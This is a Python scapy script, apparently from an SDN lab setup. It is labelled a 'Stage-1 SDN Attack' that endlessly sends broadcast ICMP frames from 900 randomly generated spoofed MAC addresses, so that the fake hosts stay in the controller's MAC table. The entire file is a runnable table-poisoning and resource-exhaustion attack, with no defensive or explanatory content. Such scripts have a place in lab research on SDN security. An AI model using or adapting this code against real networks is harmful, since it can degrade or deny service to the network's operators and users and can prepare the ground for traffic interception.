#!/usr/bin/env python3
"""
Stage-1 SDN Attack: Persistent Fake Host Injection
--------------------------------------------------
Continuously refreshes fake MAC addresses so the
controller MAC table never cleans them.
"""

from scapy.all import Ether, IP, ICMP, sendp
import random
import time

ATTACK_INTERFACE = "h1-eth0"   # attacker host interface
TARGET_IP = "10.0.0.2"         # any real host IP
TOTAL_FAKE_MACS = 900          # number of fake hosts
REFRESH_DELAY = 0.05           # low-rate refresh (seconds)


def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


# Generate fake MAC pool ONCE
fake_macs = [random_mac() for _ in range(TOTAL_FAKE_MACS)]

print("[*] Stage-1 Persistent Fake Host Injection Started")
print(f"[*] Maintaining {TOTAL_FAKE_MACS} fake MAC addresses")

# Keep refreshing forever
while True:
    for fake_mac in fake_macs:
        pkt = (
            Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(dst=TARGET_IP) /
            ICMP()
        )

        sendp(pkt, iface=ATTACK_INTERFACE, verbose=False)
        time.sleep(REFRESH_DELAY)
